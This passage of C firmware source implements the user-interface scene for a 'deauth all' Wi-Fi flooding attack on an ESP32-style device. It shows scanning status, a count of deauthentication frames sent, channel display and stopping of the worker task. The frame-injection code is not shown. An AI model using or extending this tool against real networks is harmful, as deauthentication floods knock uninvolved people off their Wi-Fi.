                strncpy(model->target_ssid, "LIB UNPATCHED", sizeof(model->target_ssid) - 1);
            } else if(s_marauder_ap_count == 0) {
                strncpy(model->target_ssid, "READY: scan", sizeof(model->target_ssid) - 1);
            } else {
                snprintf(model->target_ssid, sizeof(model->target_ssid) - 1,
                         "READY: %u APs", (unsigned)s_marauder_ap_count);
            }
            model->target_ssid[sizeof(model->target_ssid) - 1] = '\0';
        },
        true
    );

    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewDeauthAll);
}

bool wlan_app_scene_deauth_all_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;
    bool consumed = false;

    // Back saat sedang memilih durasi → batalkan (kembalikan nilai lama) & keluar
    // mode edit, JANGAN menutup scene. Selain itu Back diteruskan (pop scene).
    if(event.type == SceneManagerEventTypeBack) {
        bool was_editing = false;
        with_view_model(
            app->view_deauth_all, WlanDeauthAllModel * m,
            {
                if(m->editing_duration) {
                    m->interval_s = m->interval_s_backup;
                    m->editing_duration = false;
                    was_editing = true;
                }
            },
            true);
        return was_editing;
    }

    if(event.type == SceneManagerEventTypeCustom) {
        switch(event.event) {
        case WlanAppCustomEventDeauthAllOk:
            deauth_all_handle_ok(app);
            consumed = true;
            break;
        case WlanAppCustomEventDeauthAllNavInc:
            deauth_all_handle_nav(app, +1);
            consumed = true;
            break;
        case WlanAppCustomEventDeauthAllNavDec:
            deauth_all_handle_nav(app, -1);
            consumed = true;
            break;
        default:
            break;
        }
    }

    if(event.type == SceneManagerEventTypeTick) {
        if(s_marauder_task_done && s_marauder_ap_sync_pending) {
            deauth_copy_ap_records_to_app(app);
            s_marauder_ap_sync_pending = false;
        }

        bool task_alive = s_marauder_task_run && !s_marauder_task_done;

        with_view_model(
            app->view_deauth_all,
            WlanDeauthAllModel * model,
            {
                if(task_alive) {
                    if(s_marauder_scanning) {
                        strncpy(model->target_ssid, "SCANNING...", sizeof(model->target_ssid) - 1);
                    } else if(s_marauder_ap_count == 0) {
                        strncpy(model->target_ssid, "NO APS FOUND", sizeof(model->target_ssid) - 1);
                    } else {
                        snprintf(model->target_ssid, sizeof(model->target_ssid) - 1,
                                 "FLOOD %u APs", (unsigned)s_marauder_ap_count);
                    }
                    model->target_ssid[sizeof(model->target_ssid) - 1] = '\0';

                    model->frames = s_marauder_frames_sent;
                    model->current_channel = s_marauder_current_channel;
                    model->elapsed_ms += DEAUTH_UI_REFRESH_MS;
                } else if(model->running) {
                    model->running = false;
                    strncpy(model->target_ssid, "STOPPED", sizeof(model->target_ssid) - 1);
                    model->target_ssid[sizeof(model->target_ssid) - 1] = '\0';
                }
            },
            true
        );
        consumed = true;
    }

    return consumed;
}

void wlan_app_scene_deauth_all_on_exit(void* context) {
    WlanApp* app = (WlanApp*)context;
    s_marauder_scene_active = false;

    deauth_marauder_worker_stop(app);

    uint32_t timeout = EXIT_WAIT_MAX_MS / 10;
    while(!s_marauder_task_done && timeout > 0) {
        vTaskDelay(pdMS_TO_TICKS(10));
        timeout--;
    }

    if(!s_marauder_task_done) {
        ESP_LOGW(MARAUDER_TAG, "Exit timeout — force clearing handle");
    }
    // Selalu clear handle. Task akan cleanup sendiri saat exit via vTaskDeleteWithCaps(NULL).
    s_marauder_task = NULL;

    s_marauder_scanning = false;
    if(s_marauder_ap_sync_pending) {
        deauth_copy_ap_records_to_app(app);
        s_marauder_ap_sync_pending = false;
    }
}
